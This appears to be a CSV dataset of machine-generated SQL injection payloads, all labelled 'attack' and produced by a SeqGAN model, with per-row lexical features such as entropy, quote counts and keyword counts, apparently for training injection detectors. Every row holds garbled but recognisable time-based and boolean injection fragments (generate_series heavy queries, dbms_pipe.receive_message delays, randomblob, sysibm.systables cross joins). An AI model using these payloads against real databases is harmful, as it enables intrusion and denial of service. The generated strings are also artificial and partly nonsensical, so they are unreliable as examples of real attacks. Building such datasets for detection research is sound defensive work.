label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1%%%u4297f%%%%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""%""""vfvh""   %3018'  )   and 3202  =  like  (  ''  )   and 3202  =  like  (  ''2633c%%o$""%""c%$%$h)||||O1fu%%%%%%""  =  ""'qjle'301846%%%%%%30182'qjle'46"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""qu   'n46   b46'qjle'u' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""%""h' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +',07471#46""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""z"" like ""&' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,679,1112.0,51.0,4.209184791379038,318.0,193.0,405.0,196.0,0.28597122302158273,0.1735611510791367,0.3642086330935252,0.17625899280575538,24.0,16.0,0.0,0.0,7.0,17.0,0.0,65.0,29.0,8.0,8.0,41.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,6.0,0.0,6.0,6.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,30.0
attack,"1%%%'  )   and 3202  =  like  (  '$851446' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""0jg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'11   ('  )   and 3202  =  like  (  'ou.%%%4212%%%53330%where41238635%%%%z'  =  '%%'  =  'z%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'8b' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'=11 )        8407   --          r   4212   83 46   =%%8635%%4212%%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,680,1036.0,45.0,4.025428161090042,286.0,198.0,394.0,158.0,0.27606177606177607,0.19111969111969113,0.3803088803088803,0.1525096525096525,22.0,4.0,2.0,0.0,7.0,22.0,0.0,55.0,23.0,7.0,7.0,38.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,7.0,0.0,7.0,7.0,9.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,30.0
attack,"1%%%46%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'V]",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,681,128.0,39.0,4.094972470193748,38.0,23.0,45.0,22.0,0.296875,0.1796875,0.3515625,0.171875,2.0,0.0,0.0,0.0,1.0,2.0,0.0,7.0,6.0,1.0,1.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"%%%%2633%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +' '   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%%%M3902%%500000064147471*u%%%%'  =  '%%%%%%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z5333'  )   and make_set  (  4551  =  6487,6487  )   and   (  ''  =  'q8635j2633'  =  '%'  )   and 3202  =  like  (  ''  =  ''  )   and 3202  =  like  (  '%""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'I%'Iwhereu8407%%%%$'  =  '%%%'  =  'G%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'i""  =  ""<101101%u' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'46fP68{u8514    (oc%%%h55000000004728.4728"" +(    (   4212u8407    (   ""vfvh""y   "" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""qu(  )||c46%%%%b' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'4611   (    (   %%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +':select1%%%%$46v",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,682,1836.0,59.0,4.065232895640831,462.0,327.0,731.0,316.0,0.25163398692810457,0.1781045751633987,0.39814814814814814,0.1721132897603486,41.0,13.0,0.0,2.0,9.0,30.0,0.0,121.0,53.0,11.0,13.0,58.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,7.0,0.0,7.0,7.0,22.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,44.0
attack,"selectselectuhr'  =  '%%%'2633r%'  )   and 3202  =  like  (  '$%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  """"   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%%%'  )   and 3202  =  like  (  '%%2633'  =  '' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'"" like ""f%	""   )    )    or    (    (   ""
||c%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'LTz' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""]""  =  ""120iRx' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,683,1144.0,52.0,4.003859188231268,340.0,173.0,453.0,178.0,0.2972027972027972,0.15122377622377622,0.395979020979021,0.1555944055944056,25.0,12.0,0.0,1.0,7.0,22.0,0.0,69.0,16.0,7.0,8.0,39.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,7.0,0.0,7.0,7.0,11.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,33.0
attack,"%%%%%$3120%%%%%%%%?'  =  '%%'2367q%J%%3595`'  =  'M' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '_""%""hb'  =  '%>oX8407y%%'  =  '%533346""  =  ""(tmbpf'  =  '%R' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'8407h' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +''  =  '/2633pf%  4123h0'  )   and make_set  (  4551  =  6487,6487  )   and   (  'j>110R'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'I""   )    )     =     (    (   ""j'+  (  select '""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""A""vfvh""qun ""%""2633v%%%%%%'  =  '%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z    5f%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'V120%7417%%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%""  =  ""?W          --   5333hjr46'  =  'qiwheregfv%11qf%%%'  =  '9688]   8407%%",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,684,1632.0,64.0,4.250787450701748,495.0,250.0,605.0,282.0,0.30330882352941174,0.15318627450980393,0.3707107843137255,0.17279411764705882,43.0,18.0,2.0,2.0,9.0,31.0,0.0,86.0,49.0,9.0,13.0,53.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,9.0,0.0,6.0,8.0,18.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,41.0
attack,"%%%%041234u%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""   4123f%4123b46'qomf'""  =  ""46' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'$%%%J""  =  ""4646%%$%461%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%%""'  =  '%%%'  =  '%%%$=%""  =  """"%""8407%%%%%%%%'  =  '%9643where%%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'zzqfeOr%%%%46U'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%%%'  =  '468407%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%46
oflame'  =  't%'  )   and 3202  =  like  (  'u%%%2633%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""(   likejwhere	7417%%$4212%""  =  ""}B}68{4641%%%3902%3018?%%%%'  =  '%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'$where42123018 --%%",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,685,1590.0,60.0,4.081175725169409,396.0,256.0,635.0,303.0,0.2490566037735849,0.1610062893081761,0.39937106918238996,0.19056603773584907,36.0,21.0,2.0,4.0,4.0,27.0,0.0,105.0,67.0,6.0,11.0,47.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,4.0,0.0,4.0,4.0,17.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,31.0
attack,"%%%%101500000000%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'8635>2367qu%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'7     '  =  '2633%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'?[{Dq%e' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'46120n%%7471%%%%Rc%%%4212[<103%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +''   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   '4212qii8635_mvh%'  =  '46""   )    )     =     (    (   ""' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'{#Z""vfvh""5333u8407        (   4297 hj    p8407""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""'  =  '%q"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""b8407uo8407h9688'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'Q9%`$ty%%%3018@n' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""z13595""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'}3' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'fZL/G@'  =  '%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +''  )   and make_set  (  4551  =  6487,6487  )   and   (  'likei!'  =  'v'  =  '1205333'qomf' %%301842122367}",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,686,2838.0,67.0,4.100886418981798,799.0,526.0,1091.0,422.0,0.28153629316420015,0.18534178999295278,0.3844256518675123,0.14869626497533475,56.0,12.0,0.0,2.0,18.0,48.0,0.0,170.0,32.0,23.0,22.0,94.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,17.0,0.0,17.0,17.0,29.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,80.0
attack,"1%%%%'  )   and 3202  =  like  (  '%%`4$t'  =  '%4297%%D%%'  =  '%'  )   and 3202  =  like  (  ''  =  '%%%%%%301826332633X84074212u%%%%%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'Tg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'3595Jkz' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'i6414""  =  ""T@3902luj@' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'J"" like ""8635=qun %'  )   and 3202  =  like  (  'm%7471hjLlike98635",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,687,819.0,50.0,4.236677251853729,236.0,163.0,286.0,134.0,0.28815628815628813,0.199023199023199,0.3492063492063492,0.16361416361416362,22.0,4.0,0.0,0.0,5.0,18.0,0.0,41.0,25.0,5.0,5.0,28.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,5.0,0.0,5.0,5.0,8.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,23.0
attack,"1%%%$%%$46%%%PDq|8407""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'74""'  =  '' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'%D'  =  '%%2633' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'(Z',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'9""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """"  =  ""like2367(    (    (hrqr' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'9643    (    (qchrqr4641|8407qr'  =  '%%%%%%$b' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'9688' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'XJ>3018""u8407            112   and "" hr'  =  '46246w86354%%u%'  =  '%%30182367syh' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'zF46M""   7471hr'  =  '%q9'  =  '%%'  =  '%where2' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'/("" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""p%%7471%%",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,688,2946.0,58.0,4.152003938321023,931.0,475.0,1104.0,436.0,0.31602172437202986,0.1612355736591989,0.37474541751527496,0.14799728445349628,56.0,16.0,0.0,3.0,19.0,48.0,0.0,175.0,33.0,20.0,24.0,101.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,18.0,0.0,16.0,18.0,30.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,82.0
attack,"1%%%%%463902%$"" like ""w""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""Iz""   )    )     =     (    (   ""Qg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'i.!'  =  ''   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'|          (    (    (   _""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""468635fqjr (h5qy'  =  '%3018""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%'  =  '%""  =  ""851446kz' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'w' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'J(Vselect2367   ""up%30182633""zgt>39022ujM' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'z' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'""  =  ""46U",boolean,boolean,seqgan_improved,seqgan_improved__phase2b__boolean__D__500__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,689,2078.0,58.0,3.9302502866290907,575.0,353.0,852.0,298.0,0.27670837343599614,0.16987487969201154,0.41000962463907603,0.14340712223291627,36.0,16.0,0.0,1.0,15.0,36.0,0.0,136.0,11.0,14.0,15.0,68.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,13.0,0.0,13.0,13.0,20.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,60.0
